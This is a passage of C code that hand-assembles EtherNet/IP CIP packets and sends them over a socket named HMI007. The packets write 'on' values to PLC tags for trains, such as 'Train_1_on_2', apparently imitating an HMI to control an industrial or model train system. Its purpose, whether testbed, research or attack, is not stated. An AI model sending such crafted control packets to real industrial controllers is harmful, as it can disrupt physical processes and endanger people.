			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
			0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x32, 0x5f, 0x4f, 0x6e, 0x5f, 0x33, /*Train_2_on_3*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr2, 67, 0);
		CIPCount1++;
		Sleep(10);

		//outside
		byte sendMessageStr3[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
			0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x31, 0x5f, 0x4f, 0x6e, 0x5f, 0x32, /*Train_1_on_2*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr3, 67, 0);
		CIPCount1++;
		Sleep(10);

		byte sendMessageStr4[] = { 0x70, 0x00,	/*Send Unit Data*/		0x2b, 0x00,/*data length*/		  SessionHandle1, SessionHandle2, SessionHandle3, SessionHandle4,  /*session handle*/
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0xa1, 0x00, 0x04, 0x00,
			ConnectionID1, ConnectionID2, ConnectionID3, ConnectionID4,	/*Connection ID*/	0xb1, 0x00,		0x17, 0x00,	/*CIP length*/		CIPCount1, CIPCount2,	/*Sequence Count*/	 0x4d, /*Unknown service*/
			0x07, /*Request Path Size*/		0x91, /*ANSI Symbol Segment*/	 0x0c,	/*Data Size*/
			0x54, 0x72, 0x61, 0x69, 0x6e, 0x5f, 0x31, 0x5f, 0x4f, 0x6e, 0x5f, 0x33, /*Train_1_on_3*/	0xc1, 0x00, 0x01, 0x00, 0x01 /*Specific Data*/ };

		sendStatus = send(HMI007, sendMessageStr4, 67, 0);
		CIPCount1++;

	}
}

